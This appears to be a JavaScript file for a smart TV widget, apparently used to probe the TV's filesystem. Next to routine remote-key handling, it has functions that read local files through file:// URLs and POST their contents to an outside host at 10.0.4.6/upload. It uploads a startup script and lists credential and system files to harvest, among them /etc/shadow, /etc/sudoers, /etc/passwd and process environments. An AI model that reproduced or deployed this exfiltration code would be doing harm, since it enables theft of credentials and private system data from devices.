var widgetAPI = new Common.API.Widget();
var tvKey = new Common.API.TVKeyValue();

function httpGet(theUrl){
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false); // sync request
    try {
        xmlHttp.send(null);
        return xmlHttp;
    } catch (e) {
        console.error("Request error: " + e.message);
        console.log("Status: " + xmlHttp.status);
        console.log("ReadyState: " + xmlHttp.readyState);
        return null;
    }
}

var Main =
{

};

function getFile(file){
	console.log(file);
	file = "file://" + file;
	var xhr = new XMLHttpRequest();
	xhr.open('GET', file, false);
	try {
		xhr.send();
		console.info(xhr.status);
		//console.info(xhr.responseText);
		return xhr.response;
	} catch(e) {
		console.error(e);
		return e;
	}
}

function uploadFile(filename){
	file = getFile(filename);
	
	var xhr = new XMLHttpRequest();
	xhr.open("POST", "http://10.0.4.6/upload", true);
	type = "text/plain";
	type = "application/octet-stream";
	xhr.setRequestHeader("Content-Type", type);
	files = filename.split("/");
	xhr.setRequestHeader("X-Filename", filename.split("/")[files.length - 1]);
	xhr.send(file);
}


function realOnload(){	
	uploadFile("/etc/usb_start.sh");
	console.log("sent");
//	files = ['/proc/version', '/proc/cpuinfo', '/etc/issue', '/usr/bin/', '/etc/shadow', '/etc/group', '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime', '/proc/version', '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts', '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd', '/var/log/dmesg', '/var/log/messages'];
//	files += ['/etc/fstab', '/etc/hosts', '/etc/resolv.conf', "/etc/profile"];
	console.log(getFile)
	files = [
	         '/proc/0/environ', '/proc/version', '/proc/cpuinfo', '/etc/issue', '/etc/shadow', '/etc/group',
	         '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime',
	         '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts',
	         '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd',
	         '/var/log/dmesg', '/var/log/messages', '/etc/passwd', '/var/log/syslog',
	         '/etc/login.defs', '/etc/bash.bashrc', '/proc/self/status',
	         '/proc/self/cmdline', '/proc/self/environ', '/etc/services',
	         '/etc/nsswitch.conf', '/etc/ld.so.conf', '/etc/inputrc', '/etc/shells',
	         '/etc/hosts.allow', '/etc/hosts.deny', '/etc/sysctl.conf', '/etc/rc.local',
	         '/etc/modules', '/etc/issue.net', '/etc/crontab', '/etc/at.allow',
	         '/etc/at.deny', '/var/log/wtmp', '/var/log/btmp', '/var/log/lastlog',
	         '/var/log/faillog', '/etc/logrotate.conf'
	       ];
	for(var i = 0; i<files.length; i++){
		//console.log(getFile(files[i]));
	}
}

Main.onLoad = function()
{
	// Enable key event processing
	this.enableKeys();
	widgetAPI.sendReadyEvent();
};

Main.onUnload = function()
{

};

Main.enableKeys = function()
{
	document.getElementById("anchor").focus();
};

Main.keyDown = function()
{
	var keyCode = event.keyCode;
	console.info("pressed key");
	console.info(keyCode);
	switch(keyCode)
	{
		case tvKey.KEY_RETURN:
		case tvKey.KEY_PANEL_RETURN:
			
			widgetAPI.sendReturnEvent();
			break;
		case tvKey.KEY_LEFT:
			//addCode();
			break;
		case tvKey.KEY_RIGHT:
			//addCode();
			break;
		case tvKey.KEY_UP:
			//addCode();
			break;
		case tvKey.KEY_DOWN:
			//addCode();
			break;
		case tvKey.KEY_ENTER:
		case tvKey.KEY_PANEL_ENTER:
			//addCode();
			break;
		default:
			//addCode();
			break;
	}
};
